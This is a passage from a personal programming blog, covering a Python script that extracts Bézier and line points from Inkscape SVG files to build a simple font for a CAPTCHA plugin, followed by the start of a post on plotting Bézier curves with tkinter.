easy parsable .svg files. Then I created a little script that was
capable of exporting the Bézier points and line points of the .svg files
generated by Inkscape. That wasn't too hard, since .svg is a W3C
standard and the <path> element is perfectly described
<a href="http://www.w3.org/TR/SVG/paths.html#Introduction">here</a>.</p>
<p>The export script I made looks like this (Please consider that only
closed paths and cubic/quadratic and lines are properly parsed! If this
is not enough for your pupose, the script is easy extendable tough):</p>
<div class="highlight"><pre><span class="c"># Parse inkscap svg files and tries to obtain all bezier curves points and lines.</span>
<span class="c"># Assumes that only one glyph is drawn and extracts ALL bezier points </span>
<span class="c"># in the main  (called &#39;layer1&#39; in inkscape). Only heterogenous bezier </span>
<span class="c"># paths and straight lines are parsed correctly.</span>
<span class="c"># Read: http://www.w3.org/TR/SVG/paths.html#Introduction</span>
<span class="c"># Author: Nikolai Tschacher</span>
<span class="c"># Date: 14.10.2013</span>
<span class="c"># Site: incolumitas.com</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="k">try</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">lxml</span> <span class="kn">import</span> <span class="n">etree</span>
<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;Ohh boy, it seems that you didn</span><span class="se">\&#39;</span><span class="s">t install lxml. Try &quot;pip install lxml&quot;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">InvalidGlyphShape</span><span class="p">(</span><span class="ne">Exception</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    This Exception is raised when the parser discovers a  element</span>
<span class="sd">    that he cannot read.</span>
<span class="sd">    &#39;&#39;&#39;</span>

<span class="c"># lxml is awesome   </span>
<span class="k">def</span> <span class="nf">parse_glyph</span><span class="p">(</span><span class="n">fname</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">event</span><span class="p">,</span> <span class="n">element</span> <span class="ow">in</span> <span class="n">etree</span><span class="o">.</span><span class="n">iterparse</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">tag</span><span class="o">=</span><span class="s">&#39;{*}g&#39;</span><span class="p">):</span> <span class="c"># &quot;{*}&quot; includes the whole xml namespace</span>
        <span class="k">if</span> <span class="n">element</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;id&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="s">&#39;layer1&#39;</span><span class="p">:</span> <span class="c"># Inkscape packs all the shapes in a  container and calls it &quot;layer1&quot; by default</span>
            <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">element</span><span class="o">.</span><span class="n">iter</span><span class="p">(</span><span class="n">tag</span><span class="o">=</span><span class="s">&#39;{*}path&#39;</span><span class="p">):</span> <span class="c"># Find ALL(!) path elements</span>
                <span class="k">yield</span> <span class="n">path</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">parse_path</span><span class="p">(</span><span class="n">fname</span><span class="p">):</span>
    <span class="c"># What format do we need? List of sequence of tuples</span>
    <span class="c"># like [[(43,233), (4434, 222), (87, 387)], [(63,23), (44, 12), (87, 337)], ...]</span>
    <span class="c"># each of them constituting points of a cubic Bézier spline.</span>
    <span class="c"># ... Analogeous for the other shapes...</span>
    <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">parse_glyph</span><span class="p">(</span><span class="n">fname</span><span class="p">):</span>
        <span class="n">lines</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">c_splines</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">q_splines</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s">&#39;z&#39;</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">InvalidGlyphShape</span><span class="p">(</span><span class="s">&#39;Path is not a closed shape&#39;</span><span class="p">)</span>

        <span class="c"># If a moveto is followed by multiple pairs of coordinates,</span>
        <span class="c"># the subsequent pairs are treated as implicit lineto commands.</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>   
        <span class="k">if</span> <span class="n">cmd</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;M&#39;</span><span class="p">,</span> <span class="s">&#39;m&#39;</span><span class="p">):</span>
            <span class="k">raise</span> <span class="n">InvalidGlyphShape</span><span class="p">(</span><span class="s">&#39;No move command Mm&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span> <span class="c"># Check for implicit lineto cmd.</span>
            <span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="n">is_cmd</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">is_cmd</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">])):</span>
                <span class="n">lines</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">(</span><span class="n">sublist</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:]),</span> <span class="mi">2</span><span class="p">)])</span> <span class="c"># Lil hack here :)</span>

        <span class="c"># Magic parsing begins. Very basic parser.</span>
        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="s">&#39;Cc&#39;</span><span class="p">:</span>
                <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="n">c_splines</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">(</span><span class="n">sublist</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">:]),</span> <span class="mi">4</span><span class="p">)])</span>
            <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="s">&#39;Qq&#39;</span><span class="p">:</span>
                <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="n">q_splines</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">(</span><span class="n">sublist</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">:]),</span> <span class="mi">3</span><span class="p">)])</span>
            <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="s">&#39;Ll&#39;</span><span class="p">:</span>
                <span class="n">data</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                <span class="n">lines</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">(</span><span class="n">sublist</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">:]),</span> <span class="mi">2</span><span class="p">)])</span>
            <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="s">&#39;Zz&#39;</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="c"># closepath (close the current shape by drawing a line to the last moveto)</span>
                <span class="c"># With &quot;closepath&quot;, the end of the final segment of the subpath is &quot;joined&quot;</span>
                <span class="c"># with the start of the initial segment of the subpath.</span>
                <span class="n">lines</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]])</span>

        <span class="n">cleaned</span> <span class="o">=</span> <span class="n">clean</span><span class="p">(</span><span class="n">cubic_bezier</span><span class="o">=</span><span class="n">c_splines</span><span class="p">,</span>
                     <span class="n">quadratic_bezier</span><span class="o">=</span><span class="n">q_splines</span><span class="p">,</span>
                     <span class="n">simple_lines</span><span class="o">=</span><span class="n">lines</span><span class="p">)</span>

        <span class="k">yield</span> <span class="n">cleaned</span>

<span class="c"># clean the data. For some reason my algorithm yields single points. Just</span>
<span class="c"># remove them and the data is solid.     </span>
<span class="k">def</span> <span class="nf">clean</span><span class="p">(</span><span class="o">**</span><span class="n">args</span><span class="p">):</span>
    <span class="n">keys</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
    <span class="k">for</span> <span class="n">kw</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
        <span class="n">args</span><span class="p">[</span><span class="n">kw</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">e</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">args</span><span class="p">[</span><span class="n">kw</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">]</span>


    <span class="c"># Make integer coordinates ready to be rasterized.   </span>
    <span class="k">for</span> <span class="n">kw</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
        <span class="n">args</span><span class="p">[</span><span class="n">kw</span><span class="p">]</span> <span class="o">=</span> <span class="p">[[</span><span class="nb">tuple</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="nb">float</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">p</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)])</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">geo_el</span><span class="p">]</span> <span class="k">for</span> <span class="n">geo_el</span> <span class="ow">in</span> <span class="n">args</span><span class="p">[</span><span class="n">kw</span><span class="p">]]</span>

    <span class="k">return</span> <span class="n">args</span>

<span class="c"># print the glyph data.</span>
<span class="k">def</span> <span class="nf">pretty_print</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="n">keys</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
    <span class="k">print</span><span class="p">(</span><span class="s">&#39;----------------------- Next  data -------------------------&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">kw</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">***********</span><span class="se">\n</span><span class="s">Point data for </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">kw</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">kw</span><span class="p">])</span>

<span class="c"># Returns a sublist up to the next cmd.</span>
<span class="k">def</span> <span class="nf">sublist</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="s">&#39;CcQqLlZz&#39;</span><span class="p">:</span> <span class="c"># SVG path commands</span>
            <span class="k">return</span> <span class="n">l</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">i</span><span class="p">]</span>

<span class="c"># Check if element is a command within d attribute in  element.</span>
<span class="k">def</span> <span class="nf">is_cmd</span><span class="p">(</span><span class="n">e</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="s">&#39;CcQqLlZzMm&#39;</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="c"># Make chunks                          </span>
<span class="k">def</span> <span class="nf">chunks</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">),</span> <span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">yield</span> <span class="n">l</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="n">n</span><span class="p">]</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="c"># raises an exception if file can&#39;t be located</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">parse_path</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
            <span class="n">pretty_print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">except</span> <span class="n">FileNotFoundError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">&#39;[-] No such file, sir&#39;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">&#39;[-] Usage: </span><span class="si">%s</span><span class="s"> SvgFile&#39;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</pre></div>


<p>Now the font design can finally begin! I searched for inspiration at
googlefonts and tried to redraw the glyphs freehand. This is of course
really unprofessional, because if you actually want to implement a
<em>real</em> font, you're better off using FontForge, a nice open source
program that incorporates many tools that help you create a
sophisticated font. I won't get down that path, instead I just
implemented some cool glyphs according to my taste and after a short
design period, I imported them with the script listed above into my
python font module that was already equipped with the plotting
algorithms I discussed in the <a href="http://incolumitas.com/2013/10/06/plotting-bezier-curves/">previous
article</a>. In
the aforementioned module, I am also going to store the glyph data
(Implemented as a list of points).</p>
<p>Here are some screenshots that you guys can get a impression how my
workflow was.</p>
<p>First I roughly outline the shape of the glyph and it looks like this:  </p>
<p>[<img alt="raw-shaping a glyph" src="/uploads/2013/10/unedited-1024x576.png" /></p>
<p>Then after some reshaping:  </p>
<p>[<img alt="fine-tuning the glyph" src="/uploads/2013/10/better-1024x576.png" /></p>
<p>And finally after I exported it and redrawn it using my own
module: [<img alt="plotting with own implementation" src="/uploads/2013/10/Drawing_myself-1024x576.png" /></p>
<p>And to end this post, I will present you my final alphabet all drawn on
a tkinter canvas with my own plotting algorithms. There are also
variants where the alphabet is skewed and a shear operations ar applied.
Here are the screenshots:</p>
<p>[<img alt="All Glyphs" src="/uploads/2013/10/all_glyphs-1024x576.png" /></p>
<p>All the glyphs drawn in a scatter. They are imported from the Inkscape
.svg files and plotted using the algorithms developed in the
<a href="http://incolumitas.com/2013/10/06/plotting-bezier-curves/">last</a> blot
post.</p>
<p>And after applying some linear transformations:</p>
<p>[<img alt="Shear
transformation" src="/uploads/2013/10/shear_applied-1024x576.png" /></p>
<p>In this picture all glyphs moved using shear operations</p>
<p>[<img alt="Skew transformation" src="/uploads/2013/10/skew-1024x576.png" />
Skew linear transformation.</p>
<p>My glyphs are far from beautiful or even consistent, but this isn't
really a drawback either, since I will use them for my captcha plugin
(Whose implementation in PHP will be presented in the next blog post).
But the clear advantage is obviously that all my glyphs (although they
don't really look so) consist of simple lines and Bézier splines, which
means that we can express them as a mathematical function and therefor
apply a wide range of transformations on them without any loss of
information! After blurring the glyphs to our liking, we can finally
export it as a raster grafics format (such as png) and they eventually
become immutable. Maybe I will add in the PHP imlementation a way to
fill the glyphs with color in order to obliterate pattern recognition
methods.<br />
As mentioned before, If you are interested in professional font/glyph
design, visit <a href="http://fontforge.org">fontforge.org</a> and read the great
resources over there.</p>
<p>And that's the end! Stay tuned for the final article of my series, that
will talk about the captcha plugin!</p>
<h3>Links</h3>
<ul>
<li><a href="https://github.com/NikolaiT/CunningCaptcha">The github repository that contains all of the above code
    snippets</a></li>
<li><a href="http://fontforge.org">The fontforge home page</a></li>
<li><a href="http://inkscape.org/">The great vector drawing program Inkscape</a></li>
<li><a href="http://pomax.github.io/bezierinfo/">A wonderful insight into the applications of Bézier curves. Really
    high quality stuff!</a></li>
<li>
<p><a href="http://en.wikipedia.org/wiki/Transformation_matrix">All possible ways to move/rotate/shear
    points</a></p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/Computer_font">Computer Fonts</a></li>
<li><a href="http://en.wikipedia.org/wiki/Bresenham's_line_algorithm">Rastering
    lines</a></li>
<li><a href="http://en.wikipedia.org/wiki/B%C3%A9zier_curve">Wikipedia about Bézier
    curves</a></li>
<li><a href="http://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG w3
    standard</a></li>
</ul>
</li>
<li>
<p><a href="http://en.wikipedia.org/wiki/Bresenham's_line_algorithm">Rastering
        lines</a></p>
<ul>
<li><a href="http://en.wikipedia.org/wiki/B%C3%A9zier_curve">Wikipedia about Bézier
    curves</a></li>
<li><a href="http://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG w3
    standard</a></li>
</ul>
</li>
</ul>
  </div>
  <hr />
</article>
<article>
  <header>
    <h2><a href="/plotting-bezier-curves.html#plotting-bezier-curves">Plotting Bézier curves directly and with De Casteljau's algorithm</a></h2>
    <p>
      Posted on So 06 Oktober 2013 in <a href="/category/learning.html">Learning</a>
      &#8226; Tagged with
      <a href="/tag/font.html">Font</a>,      <a href="/tag/captcha.html">Captcha</a>,      <a href="/tag/programming.html">Programming</a>,      <a href="/tag/mathematics.html">Mathematics</a>,      <a href="/tag/learning.html">Learning</a>,      <a href="/tag/bezier.html">Bézier</a>    </p>
  </header>
  <div>
      <p><em>Last major Update: 21.10.2013</em>  </p>
<p><a href="https://github.com/NikolaiT/CunningCaptcha/tree/master/python_tests">Github repo that contains the presented code in this
post.</a></p>
<h3>Introduction</h3>
<p>In this article I will present you a very simple and in no sense
optimized algorithm written in Python 3 that plots quadratic and cubic
Bézier curves. I'll implement several variants of Bézier rasterization
algorithms. Let's call the first version the direct approach, since it
computes the corresponding x and y coordinates directly by evaluation of
the equation that describes such Bézier curvatures.  </p>
<p>The other possibility is De Casteljau's algorithm, a recursive
implementation. The general principle is illustrated
<a href="http://en.wikipedia.org/wiki/De_Casteljau's_algorithm#Geometric_interpretation">here</a>.
But the summarize the idea very briefly: In order to compute the points
of the Bézier curve, you subdivide the lines of the outer hull that are
given from the n+1 control points [Where n denotes the dimension of the
Bézier curve) at a ratio t (t goes from 0 to 1 in a loop). If you
connect the interpolation points, you'll obtain n-1 connected lines.
Then you apply the exactly same principle to these newly obtained lines
as before (recursive step), until you finally get one line remaining.
Consider again the point at the ratio t on this single line left and
BOOM you got your point on the Bézier curve for your specific t value.
Increase t and continue this process until you plotted the curve
(Graphic equivalent of the description see below. I don't own the image,
the source is: http://wiki.ece.cmu.edu)<br />
<img alt="Casteljau
Principle" src="http://wiki.ece.cmu.edu/ddl/images/DeCasteljau2.png" /><br />
In this article, I'll supply source code snippets for both algorithms
mentioned above and will add a simple performance test to compare them.
Additionally, I am going to polish the direct approach for performance
and will depict some recipes I learned from other blogs to increase the
efficiency of the plotting algorithm.</p>
<h3>Background. Splines, What for?</h3>
<p>But why do I even need such geometrical primitives? I am currently
working on my captcha wordpress plugin, which builds the captcha from
the ground up and therefore needs some mechanism to rasterize
geometrical figures such as characters (Yes for once I am talking of
<em>those</em>, not the data type\^\^). Thus I need three different shapes:
Simple lines, circles (or more generally ellipses) and lastly Bézier
curves. I could compose rudimentary characters just with lines and
circles but we do have some ambition over here, don't we? :)</p>
<p>This means that I will essentially define a new, but very primitive
font. I guess that my font will contain around 10 to 15 glyphs and it
will use a mezcla (mix) of bitmap and outline fonts techniques. If you
want to know more about them, just <a href="http://en.wikipedia.org/wiki/Computer_font#Font_types">read
it up</a><a href="http://en.wikipedia.org/wiki/Computer_font#Font_types">.</a>
I am also going to publish a separate post blog about this font project
in the near future, so stay tuned (<strong>Edit:</strong> <a href="http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/">The future has
arrived</a>.
I am really excited about how ugly and cruel this font is going to be
(Actually that's even an advantage for CAPTCHAS).</p>
<p>If you are further interested in the technical background knowledge and
mathematical properties of Bézier splines, consider reading the
<a href="http://en.wikipedia.org/wiki/B%C3%A9zier_curve">Wikipedia article</a> or
<a href="http://pomax.github.io/bezierinfo/">this wonderful tutorial</a> and then
there's also <a href="http://www.scratchapixel.com/lessons/3d-basic-lessons/lesson-11-rendering-the-teapot-bezier-surfaces/">this nice
introduction</a>.
The authors of those articles explain the concepts ways better than a
layman as I ever could. Here, I just present some simple code snippets
to get started and wet the appetite, as well as a discussion of
performance issues.</p>
<p>Finally we get to see some actual code. This python script essentially
draws quadratic and cubic Bézier curves. That's the direct approach as
stated above. Note that the code is yet horribly unoptimized.</p>
<div class="highlight"><pre><span class="kn">import</span> <span class="nn">tkinter</span>
<span class="kn">import</span> <span class="nn">math</span>

<span class="k">class</span> <span class="nc">Bezier</span><span class="p">(</span><span class="n">tkinter</span><span class="o">.</span><span class="n">Canvas</span><span class="p">):</span>
    <span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    Simple and slow algorithm to draw quadratic and </span>
<span class="sd">    cubic Bézier curves. Heavily inspired by http://pomax.github.io/bezierinfo/#control</span>
<span class="sd">    This code should just prove a concept and is not intended to be </span>
<span class="sd">    used in a real world app...</span>
<span class="sd">    Author: Nikolai Tschacher</span>
<span class="sd">    Date: 07.10.2013</span>
<span class="sd">    &#39;&#39;&#39;</span>
    <span class="c"># Because Canvas doesn&#39;t support simple pixel plotting,</span>
    <span class="c"># we need to help us out with a line with length 1 in</span>
    <span class="c"># positive x direction.</span>
    <span class="k">def</span> <span class="nf">plot_pixel</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">create_line</span><span class="p">(</span><span class="n">x0</span><span class="p">,</span> <span class="n">y0</span><span class="p">,</span> <span class="n">x0</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">y0</span><span class="p">)</span>

    <span class="c"># Calculates the quadtratic Bézier polynomial for </span>
    <span class="c"># the n+1=3 coordinates.</span>
    <span class="k">def</span> <span class="nf">quadratic_bezier_sum</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">w</span><span class="p">):</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="n">t</span> <span class="o">*</span> <span class="n">t</span> 
        <span class="n">mt</span> <span class="o">=</span> <span class="mi">1</span><span class="o">-</span><span class="n">t</span>
        <span class="n">mt2</span> <span class="o">=</span> <span class="n">mt</span> <span class="o">*</span> <span class="n">mt</span>
        <span class="k">return</span> <span class="n">w</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="n">mt2</span> <span class="o">+</span> <span class="n">w</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t</span> <span class="o">+</span> <span class="n">w</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">t2</span>

    <span class="c"># Calculates the cubic Bézier polynomial for </span>
    <span class="c"># the n+1=4 coordinates.</span>
    <span class="k">def</span> <span class="nf">cubic_bezier_sum</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">w</span><span class="p">):</span>
        <span class="n">t2</span> <span class="o">=</span> <span class="n">t</span> <span class="o">*</span> <span class="n">t</span>
        <span class="n">t3</span> <span class="o">=</span> <span class="n">t2</span> <span class="o">*</span> <span class="n">t</span>
        <span class="n">mt</span> <span class="o">=</span> <span class="mi">1</span><span class="o">-</span><span class="n">t</span>
        <span class="n">mt2</span> <span class="o">=</span> <span class="n">mt</span> <span class="o">*</span> <span class="n">mt</span>
        <span class="n">mt3</span> <span class="o">=</span> <span class="n">mt2</span> <span class="o">*</span> <span class="n">mt</span>
        <span class="k">return</span> <span class="n">w</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="n">mt3</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">w</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="n">mt2</span><span class="o">*</span><span class="n">t</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">w</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">mt</span><span class="o">*</span><span class="n">t2</span> <span class="o">+</span> <span class="n">w</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">*</span><span class="n">t3</span>

    <span class="k">def</span> <span class="nf">draw_quadratic_bez</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">):</span>
        <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">t</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">quadratic_bezier_sum</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="p">(</span><span class="n">p1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p3</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="n">y</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">quadratic_bezier_sum</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="p">(</span><span class="n">p1</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">p3</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
            <span class="c"># self.plot_pixel(math.floor(x), math.floor(y))</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">plot_pixel</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="mf">0.001</span> <span class="c"># 1000 iterations. If you want the curve to be really</span>
                       <span class="c"># fine grained, consider &quot;t += 0.0001&quot; for ten thousand iterations.</span>

    <span class="k">def</span> <span class="nf">draw_cubic_bez</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span> <span class="n">p4</span><span class="p">):</span>
        <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">t</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">x</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cubic_bezier_sum</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="p">(</span><span class="n">p1</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p2</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p3</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">p4</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="n">y</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cubic_bezier_sum</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="p">(</span><span class="n">p1</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">p3</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">p4</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
